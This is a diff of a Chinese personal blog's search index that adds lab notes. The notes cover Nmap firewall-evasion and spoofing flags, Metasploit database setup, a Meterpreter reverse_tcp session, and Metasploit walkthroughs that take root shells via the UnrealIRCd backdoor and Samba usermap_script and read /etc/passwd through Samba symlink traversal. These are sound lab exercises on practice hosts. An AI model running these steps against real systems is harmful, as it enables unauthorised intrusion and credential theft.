@@ -11,6 +11,28 @@
       </tags>
   </entry>
   <entry>
+    <title>Nmap简单使用</title>
+    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
+
+<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>nmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Typora简单语法</title>
     <url>/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<h2 id="Typora简单语法"><a href="#Typora简单语法" class="headerlink" title="Typora简单语法"></a>Typora简单语法</h2><p>​        typora是一款极致简洁的markdown文本编辑器，支持即时渲染技术，是编写markdown的好手，非常的好用。</p>
@@ -80,28 +102,6 @@
 ]]></content>
       <tags>
         <tag>typora</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nmap简单使用</title>
-    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
-
-<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>nmap</tag>
       </tags>
   </entry>
   <entry>
@@ -180,6 +180,17 @@
       </tags>
   </entry>
   <entry>
+    <title>first-blog</title>
+    <url>/2021/11/24/first-blog/</url>
+    <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
+<p><img src="/2021/11/24/first-blog/image-20211124165347049.png"></p>
+<p>11</p>
+]]></content>
+      <tags>
+        <tag>test</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>centos7安装mariadb</title>
     <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
     <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
@@ -221,17 +232,102 @@
       </tags>
   </entry>
   <entry>
-    <title>python永久换第三方库国内源</title>
-    <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
-    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-
-<p> 国内靠谱的 pip 镜像源有：</p>
-<p>(1)清华: <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
-<p>(2)豆瓣: <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
-<p>(3)阿里: <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
+    <title>metasploit之PostgreSQL</title>
+    <url>/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
+    <content><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p>
+<p><code>db_connect</code>  链接数据库</p>
+<p><code>db_disconnect</code>    断开连接</p>
+<p><code>vulns</code>     查看数据库扫描的主机的漏洞</p>
+<p><code>workspace</code>   工作空间，相对于独立的</p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p>
+<p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p>
+<p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p>
+<p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p>
+<p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p>
+<p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p>
+<p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p>
+<p>退出msf，执行<code>su postgres</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p>
+<p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p>
+<p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p>
+<p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p>
+<p>找到59行，将#去掉，并且把localhost改为*，88行去掉#,然后保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p>
+<p>编辑/etc/postgresql/9.5/main/pg_hba.conf,最后一行添加host all all 0.0.0.0/32 md5，保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p>
+<p>service postgresql restart，重启服务</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p>
+<p>打开msf，workspace –help查看用法</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p>
+<p>workspace -v查看工作空间，只有默认的一个</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p>
+<p>worksapce -a 1,workspace -a 2 添加工作空间1，2，执行workspace -v 查看工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p>
+<p>workspace -d 1删除工作空间1，执行workspace -v 查看现有工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p>
+<p>workspace 2切换到工作空间2</p>
+<p>workspace -d 2删除工作空间2,自动切换到默认工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>
 ]]></content>
       <tags>
-        <tag>python pip</tag>
+        <tag>msf PostgreSQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit之meterpreter命令</title>
+    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
+<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
+<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
+<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
+<p>执行<code>ps</code>查看进程</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
+<p><code>getuid</code> 查看权限</p>
+<p><code>pwd</code> 查看当前路径</p>
+<p><code>screentshot</code>截图</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
+<p><code>background</code>会话转入后台</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
+<p>新建终端，进入/root目录下，查看截图</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
+<p>实验结束</p>
+]]></content>
+      <tags>
+        <tag>msf meterpreter</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit溢出UnrealIRCd后门漏洞</title>
+    <url>/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="1"></p>
+<p>终端输入msfconsole，进入msf后输入<code>search unreal ircd</code>，搜索相关工具和攻击载荷</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="2"></p>
+<p>终端输入命令<code>use exploit/unix/irc/unreal_ircd_3281backdoor</code>,启用漏洞模块</p>
+<p>输入show options,查看需要设置的相关选项<br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.PNG" alt="3"><br>设置目标ip</p>
+<p>run或者exploit,开始攻击，攻击成功后，建立shell会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.PNG" alt="4"></p>
+<p>终端输入whoami，查看权限root，输入cat /etc/passwd，查看系统账户</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.PNG" alt="5"></p>
+<p>本机4444端口建立远程会话</p>
+]]></content>
+      <tags>
+        <tag>metasploit unrealircd 后门 漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -259,14 +355,58 @@
       </tags>
   </entry>
   <entry>
-    <title>first-blog</title>
-    <url>/2021/11/24/first-blog/</url>
-    <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
-<p><img src="/2021/11/24/first-blog/image-20211124165347049.png"></p>
-<p>11</p>
+    <title>python永久换第三方库国内源</title>
+    <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+
+<p> 国内靠谱的 pip 镜像源有：</p>
+<p>(1)清华: <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
+<p>(2)豆瓣: <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
+<p>(3)阿里: <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
 ]]></content>
       <tags>
-        <tag>test</tag>
+        <tag>python pip</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sysmlink漏洞</title>
+    <url>/2021/12/20/sysmlink%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="sysmlink-目录遍历漏洞"><a href="#sysmlink-目录遍历漏洞" class="headerlink" title="sysmlink 目录遍历漏洞"></a>sysmlink 目录遍历漏洞</h2><h3 id="利用sysmlink漏洞读取目标主机的passwd文件内容"><a href="#利用sysmlink漏洞读取目标主机的passwd文件内容" class="headerlink" title="利用sysmlink漏洞读取目标主机的passwd文件内容"></a>利用sysmlink漏洞读取目标主机的passwd文件内容</h3><h4 id="原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。"><a href="#原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。" class="headerlink" title="原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。"></a>原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>使用<code>nmap -sV ip</code> 扫描主机，确认开放<code>445</code>，<code>139</code>端口且安装了<code>samba</code>服务，版本为3</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220165606561.png" alt="image-20211220165606561"></p>
+<p>命令行输入<code>search samba</code>，搜索samba的相关工具和载荷。</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173445099.png" alt="image-20211220173445099"></p>
+<p>终端中输入<code>use auxiliary/admin/smb/samba_symlink_traversal</code>，启用漏洞利用模块</p>
+<p>输入<code>info</code>，<code>&quot;yes&quot;</code>表示必须要填写的信息</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173527544.png" alt="image-20211220173527544"></p>
+<p>输入<code>set RHOST 192.168.1.3</code>和<code>set SMBSHARE tmp</code>，设置主机ip地址和SAM可写文件</p>
+<p>输入exploit开始攻击</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173602852.png" alt="image-20211220173602852"></p>
+<p>新建终端，输入<code>smbclient //192.168.1.3/tmp</code>，直接回车，无密码</p>
+<p>输入<code>cd rootfs</code>,进入rootfs目录，输入ls，列出目录</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173635907.png" alt="image-20211220173635907"></p>
+<p>输入<code>more /etc/passwd</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173656794-16399930170041.png" alt="image-20211220173656794"></p>
+<p>此实验完成</p>
+]]></content>
+      <tags>
+        <tag>sysmlink msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>samba提权</title>
+    <url>/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
+<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
+<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
+<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
+<p>实验完成</p>
+]]></content>
+      <tags>
+        <tag>samba 提权</tag>
       </tags>
   </entry>
   <entry>
@@ -424,47 +564,6 @@
 ]]></content>
       <tags>
         <tag>redrock ctf writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>samba提权</title>
-    <url>/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
-<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
-<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
